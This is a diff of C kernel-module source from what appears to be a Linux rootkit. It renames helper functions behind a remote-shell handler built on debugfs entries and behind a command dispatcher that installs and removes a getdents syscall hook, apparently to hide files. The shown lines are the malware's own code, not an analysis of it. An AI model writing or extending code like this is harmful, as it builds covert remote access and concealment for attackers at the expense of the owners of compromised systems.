@@ -34,12 +34,12 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 	int ret, ret_debugfs;
 	char cmd[HTM_MAX_STRING];
 
-	char *dir_name = htm_debugfs_dir_name();
-	char *rsh_name = htm_debugfs_rsh_name();
+	char *dir_name = htm_debugfs_name_dir();
+	char *rsh_name = htm_debugfs_name_rsh();
 
 	memset(cmd, 0x00, sizeof(cmd));
 
-	ret_debugfs = htm_debugfs_rsh_create();
+	ret_debugfs = htm_debugfs_create_all();
 
 	ret = scnprintf(
 		cmd, sizeof(cmd) - 1,
@@ -127,7 +127,7 @@ notrace int htm_command(const char *cmd, __be32 *saddr)
 		return htm_cdd_destroy();
 
 	if (! strcmp(HTM_CMD_DISABLE_DEBUGFS, cmd))
-		return htm_debugfs_rsh_remove();
+		return htm_debugfs_remove_all();
 
 	if (! strcmp(HTM_CMD_DISABLE_FS, cmd)) {
 		if ((ret = htm_hook_uninstall(&hook_sys_getdents)))
@@ -159,7 +159,7 @@ notrace int htm_command(const char *cmd, __be32 *saddr)
 		return htm_cdd_create();
 
 	if (! strcmp(HTM_CMD_ENABLE_DEBUGFS, cmd))
-		return htm_debugfs_rsh_create();
+		return htm_debugfs_create_all();
 
 	if (! strcmp(HTM_CMD_ENABLE_FS, cmd)) {
 		if ((ret = htm_hook_install(&hook_sys_getdents)))
